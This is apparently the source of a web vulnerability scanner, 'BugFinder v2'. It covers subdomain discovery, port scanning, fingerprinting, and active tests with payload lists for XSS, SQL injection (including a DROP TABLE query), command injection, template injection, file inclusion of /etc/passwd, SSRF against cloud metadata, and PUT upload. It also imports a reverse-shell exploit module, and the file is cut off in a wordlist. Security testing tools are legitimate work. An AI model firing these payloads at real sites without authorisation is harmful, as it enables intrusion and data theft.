// ═══════════════════════════════════════════════════════════════
// scanner_v2.js — BugFinder v2 Scanner Engine
//
// Self-contained module. Does NOT reference scanner_utils.js or
// scanner.js. Every result is written directly to the SQLite DB
// passed via the `db` parameter.
//
// Architecture:
//   1. Fingerprint  — detect technologies, versions, headers
//   2. DNS & Infra  — DNS records, ports, hosts
//   3. Crawl        — links, forms, parameters, JS files
//   4. CVE Lookup   — query NVD/local DB for detected tech
//   5. Active Tests — focused tests based on fingerprint
//   6. Exploit      — verify exploitable vulns
//   7. Risk Score   — aggregate and score
//
// All network calls go through `httpGet` / `httpPost` wrappers
// so timeouts, error handling, and UA are consistent.
// ═══════════════════════════════════════════════════════════════

import axios from 'axios';
import https from 'https';
import dns from 'dns/promises';
import net from 'net';
import tls from 'tls';
import { URL } from 'url';
import * as cheerio from 'cheerio';
import { ReverseShellExploit, generateRandomPort, validateIP, getLocalIP } from './exploit_engine.js';


const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

// Security scanner must handle self-signed / untrusted certs
const httpsAgent = new https.Agent({ rejectUnauthorized: false });

function withTimeout(promise, ms, fallback = null) {
    let timer;
    const timeout = new Promise(resolve => {
        timer = setTimeout(() => resolve(fallback), ms);
    });
    return Promise.race([
        promise.finally(() => clearTimeout(timer)),
        timeout,
    ]);
}

async function mapLimit(items, limit, fn) {
    const results = [];
    let index = 0;
    const workers = new Array(Math.max(1, limit)).fill(0).map(async () => {
        while (index < items.length) {
            const currentIndex = index++;
            try {
                results[currentIndex] = await fn(items[currentIndex], currentIndex);
            } catch (e) {
                results[currentIndex] = undefined;
            }
        }
    });
    await Promise.all(workers);
    return results;
}

function normalizeHostname(name, domain) {
    let host = String(name || '').trim().toLowerCase();
    if (!host) return '';
    host = host.replace(/\.$/, '');
    if (host.startsWith('*.')) host = host.slice(2);
    if (!host) return '';
    if (host === domain) return host;
    if (host.endsWith(`.${domain}`)) return host;
    return '';
}

async function discoverSubdomains(domain) {
    const found = new Map(); // subdomain -> Set(sources)
    const add = (name, source) => {
        const host = normalizeHostname(name, domain);
        if (!host) return;
        if (!found.has(host)) found.set(host, new Set());
        found.get(host).add(source);
    };

    // Source 1: crt.sh (Certificate Transparency) — often rate-limited/unavailable
    try {
        const url = `https://crt.sh/?q=${encodeURIComponent(`%.${domain}`)}&output=json`;
        const r = await httpGet(url, { timeout: 15000, maxRedirects: 2 });
        if (r.status >= 200 && r.status < 300) {
            let rows = r.data;
            if (typeof rows === 'string') {
                rows = rows.trim();
                // crt.sh sometimes returns multiple JSON objects concatenated; try to parse normally first
                try {
                    rows = JSON.parse(rows);
                } catch (_) {
                    rows = null;
                }
            }
            if (Array.isArray(rows)) {
                for (const row of rows) {
                    const candidates = [];
                    if (row?.name_value) candidates.push(...String(row.name_value).split(/\s+/g));
                    if (row?.common_name) candidates.push(String(row.common_name));
                    for (const c of candidates) add(c, 'crtsh');
                }
            }
        }
    } catch (_) {}

    // Source 2: HackerTarget hostsearch (free, may rate-limit)
    try {
        const url = `https://api.hackertarget.com/hostsearch/?q=${encodeURIComponent(domain)}`;
        const r = await httpGet(url, { timeout: 12000, maxRedirects: 2 });
        if (r.status >= 200 && r.status < 300 && typeof r.data === 'string' && !/error/i.test(r.data)) {
            for (const line of r.data.split('\n')) {
                const sub = line.split(',')[0]?.trim();
                add(sub, 'hackertarget');
            }
        }
    } catch (_) {}

    // Source 3: RapidDNS HTML scraping
    try {
        const url = `https://rapiddns.io/subdomain/${encodeURIComponent(domain)}?full=1`;
        const r = await httpGet(url, { timeout: 15000, maxRedirects: 2, headers: { 'Accept': 'text/html' } });
        if (r.status >= 200 && r.status < 300 && typeof r.data === 'string' && r.data.length > 200) {
            const $ = cheerio.load(r.data);
            $('td').each((_, el) => {
                const text = $(el).text().trim();
                add(text, 'rapiddns');
            });
        }
    } catch (_) {}

    // Source 4: DNS brute-force common prefixes (works even when external sources are blocked)
    // const commonPrefixes = [
    //     'www', 'mail', 'ftp', 'smtp', 'pop', 'imap', 'webmail', 'ns1', 'ns2',
    //     'api', 'dev', 'staging', 'test', 'beta', 'admin', 'portal', 'vpn',
    //     'remote', 'gateway', 'secure', 'login', 'app', 'blog', 'shop',
    //     'store', 'cdn', 'static', 'assets', 'media', 'img', 'images',
    //     'docs', 'help', 'support', 'status', 'monitor', 'dashboard',
    //     'm', 'mobile', 'auth', 'sso', 'oauth', 'git', 'gitlab', 'jenkins',
    //     'ci', 'jira', 'confluence', 'wiki', 'intranet', 'internal',
    //     'db', 'database', 'mysql', 'postgres', 'redis', 'mongo',
    //     'backup', 'old', 'new', 'v2', 'v3', 'sandbox',
    //     'demo', 'preview', 'stage', 'uat', 'qa', 'prod',
    //     'cpanel', 'plesk', 'whm', 'webdisk', 'autodiscover',
    //     'mx', 'mx1', 'mx2', 'relay', 'email', 'newsletter',
    //     'cloud', 'aws', 'gcp', 'azure', 's3', 'storage'
    // ];

    // await mapLimit(commonPrefixes, 25, async (prefix) => {
    //     const host = `${prefix}.${domain}`;
    //     const res = await withTimeout(dns.resolve4(host), 2500, null);
    //     if (Array.isArray(res) && res.length > 0) add(host, 'dnsbrute');
    // });

    // Build final list with per-subdomain source info
    const out = [];
    for (const [subdomain, sources] of found.entries()) {
        const src = Array.from(sources).sort();
        out.push({ subdomain, source: src.join('+') });
    }
    out.sort((a, b) => a.subdomain.localeCompare(b.subdomain));
    return out.slice(0, 500);
}

// ─── HTTP helpers ────────────────────────────────────────────

async function httpGet(url, opts = {}) {
    return axios.get(url, {
        timeout: opts.timeout || 10000,
        validateStatus: () => true,
        maxRedirects: opts.maxRedirects ?? 5,
        headers: { 'User-Agent': UA, ...opts.headers },
        maxContentLength: 8_000_000,
        maxBodyLength: 8_000_000,
        httpsAgent,
    });
}

async function httpPost(url, data, opts = {}) {
    return axios.post(url, data, {
        timeout: opts.timeout || 10000,
        validateStatus: () => true,
        headers: { 'User-Agent': UA, 'Content-Type': 'application/json', ...opts.headers },
        maxContentLength: 8_000_000,
        maxBodyLength: 8_000_000,
        httpsAgent,
    });
}

// ─── 1. Technology Fingerprinting ────────────────────────────

const TECH_SIGNATURES = [
    // server
    { name: 'nginx',      cat: 'server',    headerKey: 'server', pattern: /nginx/i },
    { name: 'Apache',     cat: 'server',    headerKey: 'server', pattern: /apache/i },
    { name: 'IIS',        cat: 'server',    headerKey: 'server', pattern: /microsoft-iis/i },
    { name: 'LiteSpeed',  cat: 'server',    headerKey: 'server', pattern: /litespeed/i },
    { name: 'Caddy',      cat: 'server',    headerKey: 'server', pattern: /caddy/i },
    { name: 'Cloudflare', cat: 'cdn',       headerKey: 'server', pattern: /cloudflare/i },
    // language / runtime
    { name: 'PHP',        cat: 'language',  headerKey: 'x-powered-by', pattern: /php/i },
    { name: 'ASP.NET',    cat: 'language',  headerKey: 'x-powered-by', pattern: /asp\.net/i },
    { name: 'Express',    cat: 'framework', headerKey: 'x-powered-by', pattern: /express/i },
    // html-based
    { name: 'WordPress',  cat: 'cms',       html: /wp-content|wp-includes|wp-json/i },
    { name: 'Drupal',     cat: 'cms',       html: /Drupal\.settings|sites\/default/i },
    { name: 'Joomla',     cat: 'cms',       html: /\/media\/jui|com_content/i },
    { name: 'React',      cat: 'framework', html: /__NEXT_DATA__|react-root|_next\/static|reactroot/i },
    { name: 'Next.js',    cat: 'framework', html: /__NEXT_DATA__|_next\/static/i },
    { name: 'Vue.js',     cat: 'framework', html: /vue-app|__vue__|vue\.min\.js/i },
    { name: 'Angular',    cat: 'framework', html: /ng-version|ng-app|angular\.min\.js/i },
    { name: 'Django',     cat: 'framework', headerKey: 'x-frame-options', html: /csrfmiddlewaretoken/i },
    { name: 'Laravel',    cat: 'framework', html: /laravel_session|laravel/i, headerKey: 'set-cookie', headerPattern: /laravel_session/i },
    { name: 'jQuery',     cat: 'library',   html: /jquery[\.-](\d+\.\d+)/i },
    { name: 'Bootstrap',  cat: 'library',   html: /bootstrap[\.-](\d+\.\d+)/i },
    { name: 'Swagger',    cat: 'api',       html: /swagger-ui|openapi/i },
    { name: 'GraphQL',    cat: 'api',       html: /graphql|__schema/i },
];

function fingerprint(headers, html) {
    const techs = [];
    const seen = new Set();
    for (const sig of TECH_SIGNATURES) {
        if (seen.has(sig.name)) continue;
        let match = false;
        let version = '';

        // header match
        if (sig.headerKey && headers[sig.headerKey]) {
            const rawVal = headers[sig.headerKey];
            const val = Array.isArray(rawVal)
                ? rawVal.join('; ')
                : (rawVal == null ? '' : String(rawVal));
            if (sig.headerPattern) {
                match = sig.headerPattern.test(val);
            } else if (sig.pattern) {
                match = sig.pattern.test(val);
            }
            // try to extract version from header
            const vm = val.match(new RegExp(sig.name + '[/ ]*([\\d.]+)', 'i'));
            if (vm) version = vm[1];
        }

        // html match
        if (!match && sig.html && html) {
            match = sig.html.test(html);
            if (match && !version) {
                const vm = html.match(new RegExp(sig.name + '[/ -]*([\\d.]+)', 'i'));
                if (vm) version = vm[1];
            }
        }

        if (match) {
            seen.add(sig.name);
            techs.push({ name: sig.name, version, category: sig.cat });
        }
    }
    return techs;
}

// ─── 2. DNS Resolution ──────────────────────────────────────

async function resolveDNS(domain) {
    const records = [];
    const types = [
        { method: 'resolve4',  type: 'A' },
        { method: 'resolve6',  type: 'AAAA' },
        { method: 'resolveMx', type: 'MX' },
        { method: 'resolveTxt',type: 'TXT' },
        { method: 'resolveNs', type: 'NS' },
        { method: 'resolveCname', type: 'CNAME' },
    ];
    for (const t of types) {
        try {
            const res = await dns[t.method](domain);
            const values = Array.isArray(res) ? res : [res];
            for (const v of values) {
                const val = typeof v === 'string' ? v
                    : v?.exchange ? `${v.exchange} (pri ${v.priority})`
                    : Array.isArray(v) ? v.join(' ')
                    : JSON.stringify(v);
                records.push({ type: t.type, value: val });
            }
        } catch (_) {}
    }
    return records;
}

// ─── 3. Port Scanner ─────────────────────────────────────────

const COMMON_PORTS = [21,22,25,53,80,110,143,443,445,993,995,2082,2083,3306,3389,5432,5900,6379,8000,8080,8443,8888,9200,27017];

const PORT_SERVICES = {
    21:'FTP',22:'SSH',25:'SMTP',53:'DNS',80:'HTTP',110:'POP3',
    143:'IMAP',443:'HTTPS',445:'SMB',993:'IMAPS',995:'POP3S',
    2082:'cPanel',2083:'cPanel SSL',3306:'MySQL',3389:'RDP',
    5432:'PostgreSQL',5900:'VNC',6379:'Redis',8000:'HTTP-Alt',
    8080:'HTTP-Proxy',8443:'HTTPS-Alt',8888:'HTTP-Alt',9200:'Elasticsearch',
    27017:'MongoDB',
};

async function portScan(host, ports = COMMON_PORTS) {
    const open = [];
    const checks = ports.map(port =>
        new Promise(resolve => {
            const sock = new net.Socket();
            sock.setTimeout(2500);
            sock.on('connect', () => { open.push({ port, service: PORT_SERVICES[port] || 'unknown' }); sock.destroy(); resolve(); });
            sock.on('timeout', () => { sock.destroy(); resolve(); });
            sock.on('error',   () => { sock.destroy(); resolve(); });
            sock.connect(port, host);
        })
    );
    await Promise.all(checks);
    return open.sort((a, b) => a.port - b.port);
}

// ─── 4. SSL / TLS Check ─────────────────────────────────────

async function checkSSL(domain) {
    return new Promise((resolve) => {
        const sock = tls.connect(443, domain, { servername: domain, rejectUnauthorized: false, timeout: 8000 }, () => {
            const cert = sock.getPeerCertificate();
            const proto = sock.getProtocol();
            const cipher = sock.getCipher();
            sock.end();
            if (!cert || !cert.subject) return resolve(null);
            resolve({
                protocol: proto,
                cipher: cipher?.name || '',
                issuer: cert.issuer?.O || cert.issuer?.CN || '',
                subject: cert.subject?.CN || '',
                validFrom: cert.valid_from,
                validTo: cert.valid_to,
                daysUntilExpiry: Math.floor((new Date(cert.valid_to) - Date.now()) / 86400000),
                expired: new Date(cert.valid_to) < Date.now(),
                selfSigned: cert.issuer?.CN === cert.subject?.CN,
                altNames: cert.subjectaltname?.split(', ').map(s => s.replace('DNS:', '')) || [],
            });
        });
        sock.on('error', () => resolve(null));
        sock.on('timeout', () => { sock.destroy(); resolve(null); });
    });
}

// ─── 5. Crawl ─────────────────────────────────────────────────

function extractLinks(baseUrl, html) {
    const links = new Set();
    const formEntries = [];
    const params = new Set();
    const jsFiles = [];

    // href / src
    const refRe = /(?:href|src|action)=["']([^"']+)["']/gi;
    let m;
    while ((m = refRe.exec(html))) {
        try {
            const abs = new URL(m[1], baseUrl).href;
            links.add(abs);
            if (/\.js(\?|$)/i.test(abs)) jsFiles.push(abs);
        } catch (_) {}
    }

    // forms
    const formRe = /<form[^>]*action=["']?([^"' >]+)["']?[^>]*method=["']?(\w+)["']?[^>]*>([\s\S]*?)<\/form>/gi;
    while ((m = formRe.exec(html))) {
        const action = m[1] || '';
        const method = (m[2] || 'GET').toUpperCase();
        const body = m[3];
        const inputRe = /name=["']([^"']+)["']/gi;
        const inputs = [];
        let n;
        while ((n = inputRe.exec(body))) { inputs.push(n[1]); params.add(n[1]); }
        formEntries.push({ action, method, inputs });
    }

    // URL params from links
    for (const link of links) {
        try {
            const u = new URL(link);
            for (const p of u.searchParams.keys()) params.add(p);
        } catch (_) {}
    }

    return { links: [...links], jsFiles, forms: formEntries, params: [...params] };
}

// ─── 5b. Deep Crawl — follows same-origin links ─────────────

async function deepCrawl(baseUrl, maxPages = 10) {
    const visited = new Set();
    const allLinks = new Set();
    const allForms = [];
    const allParams = new Set();
    const allJsFiles = new Set();
    const queue = [baseUrl];
    let origin;
    try { origin = new URL(baseUrl).origin; } catch { return { links: [], jsFiles: [], forms: [], params: [], pagesVisited: 0 }; }

    while (queue.length > 0 && visited.size < maxPages) {
        const url = queue.shift();
        if (visited.has(url)) continue;
        visited.add(url);
        try {
            const r = await httpGet(url, { timeout: 8000 });
            const html = typeof r.data === 'string' ? r.data : '';
            if (!html) continue;
            const { links, jsFiles, forms, params } = extractLinks(url, html);
            for (const l of links) allLinks.add(l);
            for (const js of jsFiles) allJsFiles.add(js);
            for (const f of forms) allForms.push(f);
            for (const p of params) allParams.add(p);
            for (const link of links) {
                try {
                    const u = new URL(link);
                    if (u.origin === origin && !visited.has(link) && !/\.(jpg|png|gif|svg|css|ico|woff|woff2|ttf|eot|pdf|zip|mp4|mp3)(\?|$)/i.test(link)) {
                        queue.push(link);
                    }
                } catch {}
            }
        } catch {}
    }
    return { links: [...allLinks], jsFiles: [...allJsFiles], forms: allForms, params: [...allParams], pagesVisited: visited.size };
}

// ─── 6. CVE Lookup (NVD API v2) ──────────────────────────────

async function fetchCVEs(keyword, maxResults = 10) {
    try {
        const url = `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${encodeURIComponent(keyword)}&resultsPerPage=${maxResults}`;
        const res = await httpGet(url, { timeout: 15000 });
        if (!res.data?.vulnerabilities) return [];
        return res.data.vulnerabilities.map(v => {
            const cve = v.cve;
            const desc = cve.descriptions?.find(d => d.lang === 'en')?.value || '';
            const metrics = cve.metrics?.cvssMetricV31?.[0]?.cvssData
                || cve.metrics?.cvssMetricV2?.[0]?.cvssData;
            const score = metrics?.baseScore || 0;
            const severity = score >= 9 ? 'critical' : score >= 7 ? 'high' : score >= 4 ? 'medium' : 'low';
            return {
                cve_id: cve.id,
                description: desc.substring(0, 500),
                cvss_score: score,
                severity,
                published: cve.published,
            };
        });
    } catch (_) {
        return [];
    }
}

// ─── 7. Security Header Analysis ─────────────────────────────

const SECURITY_HEADERS = [
    { name: 'Strict-Transport-Security', key: 'strict-transport-security', severity: 'medium', desc: 'HSTS missing — susceptible to protocol downgrade' },
    { name: 'Content-Security-Policy',   key: 'content-security-policy',   severity: 'medium', desc: 'CSP missing — increased XSS risk' },
    { name: 'X-Frame-Options',           key: 'x-frame-options',           severity: 'medium', desc: 'Clickjacking possible' },
    { name: 'X-Content-Type-Options',    key: 'x-content-type-options',    severity: 'low',    desc: 'MIME-sniffing possible' },
    { name: 'Referrer-Policy',           key: 'referrer-policy',           severity: 'low',    desc: 'Referrer leakage possible' },
    { name: 'Permissions-Policy',        key: 'permissions-policy',        severity: 'low',    desc: 'Browser features not restricted' },
    { name: 'X-XSS-Protection',         key: 'x-xss-protection',         severity: 'info',   desc: 'Legacy XSS filter not set' },
];

function analyzeHeaders(headers) {
    const missing = [];
    const present = [];
    for (const h of SECURITY_HEADERS) {
        if (headers[h.key]) present.push({ name: h.name, value: headers[h.key] });
        else missing.push({ name: h.name, severity: h.severity, description: `Missing ${h.name}: ${h.desc}` });
    }
    return { missing, present };
}

// ─── 8. Active Vuln Tests ─────────────────────────────────────

// The test functions each return { vulnerable, type, detail }

async function testXSS(url, paramsList) {
    const payloads = [
        // Reflected XSS
        '<img src=x onerror=alert(1)>',
        '"onmouseover="alert(1)"',
        '<script>alert(1)</script>',
        // SVG-based
        '<svg onload=alert(1)>',
        '<svg/onload=alert(1)>',
        // Event handlers
        "' onfocus='alert(1)' autofocus='",
        '" autofocus onfocus="alert(1)',
        // Tag injection
        '<details open ontoggle=alert(1)>',
        '<body onload=alert(1)>',
        // Encoding bypass
        '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
        // Polyglot
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
    ];
    const targets = paramsList.length > 0 ? paramsList : ['q', 'search', 'input', 'name', 'user', 'text', 'message', 'comment', 'value', 'data'];
    for (const payload of payloads) {
        for (const param of targets.slice(0, 15)) {
            try {
                const testUrl = `${url}${url.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(payload)}`;
                const r = await httpGet(testUrl, { timeout: 6000 });
                const body = typeof r.data === 'string' ? r.data : '';
                if (body.includes(payload)) {
                    return { vulnerable: true, type: 'XSS', param, payload, url: testUrl, evidence: `Reflected in response via "${param}"`, responseSnippet: body.substring(body.indexOf(payload) - 50, body.indexOf(payload) + payload.length + 50) };
                }
            } catch (_) {}
        }
    }
    return { vulnerable: false, type: 'XSS' };
}

async function testSQLi(url, paramsList) {
    const payloads = [
        // Classic
        "' OR '1'='1' --",
        "1 UNION SELECT NULL--",
        // Time-based blind
        "1; WAITFOR DELAY '0:0:3'--",
        "1' AND SLEEP(3)--",
        "1; SELECT pg_sleep(3)--",
        // Error-based
        "' AND 1=CONVERT(int, @@version)--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
        // Boolean-based blind
        "1' AND '1'='1",
        "1' AND '1'='2",
        // Stacked queries
        "1'; DROP TABLE test--",
        // Double-encoding
        "%27%20OR%201%3D1--",
    ];
    const errors = [
        'sql syntax', 'mysql', 'sqlstate', 'postgresql', 'ora-', 'sqlite3',
        'unclosed quotation', 'unterminated', 'syntax error', 'odbc',
        'microsoft jet', 'invalid query', 'sql server', 'mariadb',
        'db2 sql', 'pg_query', 'you have an error in your sql',
        'warning: mysql', 'valid mysql result', 'mysqlclient',
        'supplied argument is not a valid', 'column count doesn',
    ];
    const targets = paramsList.length > 0 ? paramsList : ['id', 'user', 'page', 'category', 'item', 'order', 'sort', 'filter', 'type'];
    for (const payload of payloads) {
        for (const param of targets.slice(0, 15)) {
            try {
                const testUrl = `${url}${url.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(payload)}`;
                const start = Date.now();
                const r = await httpGet(testUrl, { timeout: 8000 });
                const elapsed = Date.now() - start;
                const body = (typeof r.data === 'string' ? r.data : '').toLowerCase();
                const found = errors.find(e => body.includes(e));
                if (found) return { vulnerable: true, type: 'SQLi', param, payload, url: testUrl, evidence: `SQL error "${found}" triggered via "${param}"`, responseSnippet: body.substring(body.indexOf(found) - 40, body.indexOf(found) + 80) };
                // Time-based detection
                if ((payload.includes('SLEEP') || payload.includes('DELAY') || payload.includes('pg_sleep')) && elapsed > 2800) {
                    return { vulnerable: true, type: 'SQLi', param, payload, url: testUrl, evidence: `Time-based blind SQLi: ${elapsed}ms delay via "${param}" (expected ~3000ms)` };
                }
            } catch (_) {}
        }
    }
    return { vulnerable: false, type: 'SQLi' };
}

async function testRCE(url, paramsList) {
    const marker = 'BFv2_' + Date.now();
    const injections = [
        // Linux
        `;echo ${marker}`, `|echo ${marker}`, `$(echo ${marker})`, `\`echo ${marker}\``,
        // Windows
        `& echo ${marker}`, `| echo ${marker}`, `&& echo ${marker}`,
        // Newline injection
        `%0aecho ${marker}`, `%0d%0aecho ${marker}`,
    ];
    const targets = paramsList.length > 0 
        ? paramsList.filter(p => ['cmd','exec','command','host','ip','ping','query','input','run','path','file','dir','target','address','domain','process','shell','system'].includes(p.toLowerCase()))
        : ['cmd', 'exec', 'command', 'host', 'ip', 'ping', 'input', 'run', 'process'];
    if (targets.length === 0) return { vulnerable: false, type: 'RCE' };
    for (const inj of injections) {
        for (const param of targets.slice(0, 10)) {
            try {
                const testUrl = `${url}${url.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(inj)}`;
                const r = await httpGet(testUrl, { timeout: 8000 });
                if (typeof r.data === 'string' && r.data.includes(marker)) {
                    return { vulnerable: true, type: 'RCE', param, payload: inj, url: testUrl, evidence: `Marker "${marker}" appeared in response via "${param}"`, responseSnippet: r.data.substring(r.data.indexOf(marker) - 50, r.data.indexOf(marker) + marker.length + 50) };
                }
            } catch (_) {}
        }
    }
    return { vulnerable: false, type: 'RCE' };
}

async function testSSTI(url, paramsList) {
    const probes = [
        { payload: '{{7*7}}',       expect: '49',    engine: 'Jinja2/Twig' },
        { payload: '${7*7}',        expect: '49',    engine: 'Freemarker/EL' },
        { payload: '<%= 7*7 %>',    expect: '49',    engine: 'ERB/EJS' },
        { payload: '#{7*7}',        expect: '49',    engine: 'Ruby/Slim' },
        { payload: '{{7*\'7\'}}',   expect: '7777777', engine: 'Jinja2' },
        { payload: '${7*7}',        expect: '49',    engine: 'Java EL' },
        { payload: '#set($x=7*7)${x}', expect: '49', engine: 'Velocity' },
        { payload: '{{constructor.constructor("return 1+1")()}}', expect: '2', engine: 'Pug/Jade' },
    ];
    const targets = paramsList.length > 0 ? paramsList : ['name', 'template', 'q', 'search', 'input', 'text', 'message', 'email', 'title', 'content'];
    for (const probe of probes) {
        for (const param of targets.slice(0, 12)) {
            try {
                const testUrl = `${url}${url.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(probe.payload)}`;
                const r = await httpGet(testUrl, { timeout: 6000 });
                const body = typeof r.data === 'string' ? r.data : '';
                if (body.includes(probe.expect) && !body.includes(probe.payload)) {
                    return { vulnerable: true, type: 'SSTI', param, payload: probe.payload, engine: probe.engine, url: testUrl, evidence: `${probe.payload} evaluated to ${probe.expect} (${probe.engine})` };
                }
            } catch (_) {}
        }
    }
    return { vulnerable: false, type: 'SSTI' };
}

async function testLFI(url, paramsList) {
    const paths = [
        '../../../etc/passwd',
        '....//....//....//etc/passwd',
        '/etc/passwd',
        'php://filter/convert.base64-encode/resource=index.php',
        '..\\..\\..\\windows\\win.ini',
        '..%2f..%2f..%2fetc%2fpasswd',
        '....//....//....//windows/win.ini',
        '%252e%252e%252fetc%252fpasswd',
        '/proc/self/environ',
        'file:///etc/passwd',
    ];
    const targets = paramsList.length > 0
        ? paramsList.filter(p => ['file','path','page','include','template','doc','view','load','dir','folder','download','read','content','source','conf','log'].includes(p.toLowerCase()))
        : ['file', 'path', 'page', 'include', 'template', 'doc', 'view', 'load', 'download'];
    if (targets.length === 0) return { vulnerable: false, type: 'LFI' };
    for (const path of paths) {
        for (const param of targets.slice(0, 10)) {
            try {
                const testUrl = `${url}${url.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(path)}`;
                const r = await httpGet(testUrl, { timeout: 6000 });
                const body = typeof r.data === 'string' ? r.data : '';
                if (body.includes('root:') || body.includes('daemon:') || body.includes('PD9waH') || body.includes('[fonts]') || body.includes('[extensions]')) {
                    return { vulnerable: true, type: 'LFI', param, payload: path, url: testUrl, evidence: `File content leaked via "${param}"`, responseSnippet: body.substring(0, 200) };
                }
            } catch (_) {}
        }
    }
    return { vulnerable: false, type: 'LFI' };
}

async function testOpenRedirect(url, paramsList) {
    const targets = paramsList.length > 0
        ? paramsList.filter(p => ['url','redirect','next','return','returnTo','goto','continue','ref','callback','dest','destination','rurl','target','out','link','forward'].includes(p.toLowerCase()))
        : ['url', 'redirect', 'next', 'return', 'goto', 'continue', 'dest', 'forward'];
    if (targets.length === 0) return { vulnerable: false, type: 'Open Redirect' };
    const evilUrls = ['https://evil.example.com', '//evil.example.com', '/\\evil.example.com'];
    for (const evil of evilUrls) {
        for (const param of targets.slice(0, 10)) {
            try {
                const testUrl = `${url}${url.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(evil)}`;
                const r = await httpGet(testUrl, { timeout: 5000, maxRedirects: 0 });
                const loc = r.headers['location'] || '';
                if ([301, 302, 303, 307, 308].includes(r.status) && loc.includes('evil.example.com')) {
                    return { vulnerable: true, type: 'Open Redirect', param, payload: evil, url: testUrl, evidence: `Redirects to ${loc}` };
                }
            } catch (e) {
                if (e.response?.headers?.location?.includes('evil.example.com')) {
                    return { vulnerable: true, type: 'Open Redirect', param, payload: evil, evidence: `Redirects to ${e.response.headers.location}` };
                }
            }
        }
    }
    return { vulnerable: false, type: 'Open Redirect' };
}

async function testCORS(url) {
    try {
        const r = await httpGet(url, { headers: { Origin: 'https://evil.example.com' } });
        const acao = r.headers['access-control-allow-origin'] || '';
        const acac = r.headers['access-control-allow-credentials'] || '';
        if (acao === '*' || acao.includes('evil.example.com')) {
            return { vulnerable: true, type: 'CORS', evidence: `ACAO: ${acao}, Credentials: ${acac}`, severity: acac === 'true' ? 'high' : 'medium' };
        }
    } catch (_) {}
    return { vulnerable: false, type: 'CORS' };
}

// ─── 8b. SSRF Detection ──────────────────────────────────────

async function testSSRF(url, paramsList) {
    // Tests for SSRF by checking if internal addresses are accessible
    const ssrfPayloads = [
        'http://127.0.0.1',
        'http://localhost',
        'http://169.254.169.254/latest/meta-data/',   // AWS metadata
        'http://[::1]',
        'http://0x7f000001',
        'http://017700000001',
        'http://127.0.0.1:22',
        'http://127.0.0.1:3306',
    ];
    const ssrfIndicators = [
        'ami-id', 'instance-id', 'local-hostname', 'meta-data',          // AWS
        'root:', 'daemon:',                                                 // file content
        'SSH-', 'OpenSSH',                                                  // SSH banner
        'mysql', 'MariaDB',                                                 // DB banners
        'Connection refused',                                               // internal reach
    ];
    const targets = paramsList.length > 0
        ? paramsList.filter(p => ['url','uri','src','source','link','href','fetch','proxy','target','page','load','file','path','callback','webhook','api','endpoint','dest','redirect','img','image'].includes(p.toLowerCase()))
        : ['url', 'src', 'link', 'fetch', 'proxy', 'target', 'callback', 'api', 'endpoint'];
    if (targets.length === 0) return { vulnerable: false, type: 'SSRF' };
    for (const payload of ssrfPayloads) {
        for (const param of targets.slice(0, 8)) {
            try {
                const testUrl = `${url}${url.includes('?') ? '&' : '?'}${param}=${encodeURIComponent(payload)}`;
                const r = await httpGet(testUrl, { timeout: 8000 });
                const body = typeof r.data === 'string' ? r.data : '';
                const indicator = ssrfIndicators.find(ind => body.includes(ind));
                if (indicator) {
                    return { vulnerable: true, type: 'SSRF', param, payload, url: testUrl, evidence: `SSRF indicator "${indicator}" found via "${param}" with payload ${payload}`, responseSnippet: body.substring(0, 200) };
                }
            } catch (_) {}
        }
    }
    return { vulnerable: false, type: 'SSRF' };
}

// ─── 8c. HTTP Method Testing ─────────────────────────────────

async function testHTTPMethods(url) {
    const dangerousMethods = ['PUT', 'DELETE', 'TRACE', 'CONNECT', 'PATCH'];
    const results = [];
    // First check OPTIONS
    try {
        const opts = await axios({ method: 'OPTIONS', url, timeout: 6000, validateStatus: () => true, httpsAgent, headers: { 'User-Agent': UA } });
        const allow = opts.headers['allow'] || opts.headers['access-control-allow-methods'] || '';
        if (allow) {
            const allowed = allow.split(',').map(m => m.trim().toUpperCase());
            for (const m of dangerousMethods) {
                if (allowed.includes(m)) {
                    results.push({ method: m, evidence: `${m} listed in Allow header: ${allow}` });
                }
            }
        }
    } catch (_) {}
    // Test TRACE specifically (XST)
    try {
        const tr = await axios({ method: 'TRACE', url, timeout: 5000, validateStatus: () => true, httpsAgent, headers: { 'User-Agent': UA, 'X-Custom-Header': 'BFv2-TRACE-Test' } });
        const body = typeof tr.data === 'string' ? tr.data : '';
        if (tr.status === 200 && body.includes('BFv2-TRACE-Test')) {
            results.push({ method: 'TRACE', evidence: 'TRACE enabled — Cross-Site Tracing (XST) possible. Request headers reflected in response.' });
        }
    } catch (_) {}
    // Test PUT
    try {
        const pr = await axios({ method: 'PUT', url: url + '/bf_test_put_' + Date.now() + '.txt', data: 'bugfinder-test', timeout: 5000, validateStatus: () => true, httpsAgent, headers: { 'User-Agent': UA, 'Content-Type': 'text/plain' } });
        if ([200, 201, 204].includes(pr.status)) {
            results.push({ method: 'PUT', evidence: `PUT returned ${pr.status} — file upload may be possible` });
        }
    } catch (_) {}
    return {
        vulnerable: results.length > 0,
        type: 'HTTP Methods',
        hits: results,
        evidence: results.length > 0 ? results.map(r => `${r.method}: ${r.evidence}`).join('; ') : 'No dangerous methods enabled',
    };
}

// ─── 8d. Directory Bruteforce ────────────────────────────────

const DIRECTORY_WORDLIST = [
    'admin', 'administrator', 'login', 'dashboard', 'panel', 'wp-admin',
    'api', 'api/v1', 'api/v2', 'api/docs', 'api/swagger',
    'console', 'portal', 'manage', 'manager', 'system',
    'backup', 'backups', 'db', 'database', 'dump', 'export',
    'config', 'configuration', 'settings', 'setup', 'install',
    'test', 'testing', 'dev', 'debug', 'staging',
    'uploads', 'upload', 'files', 'media', 'images', 'static',
    'private', 'internal', 'secret', 'hidden', '.hidden',
    'phpmyadmin', 'pma', 'adminer', 'phpMyAdmin',
    'wp-content', 'wp-includes', 'wp-config.php.bak',
    'cgi-bin', 'bin', 'scripts',
    'logs', 'log', 'error_log', 'access_log',
    'tmp', 'temp', 'cache', '.cache',
    'node_modules', 'vendor', 'packages',
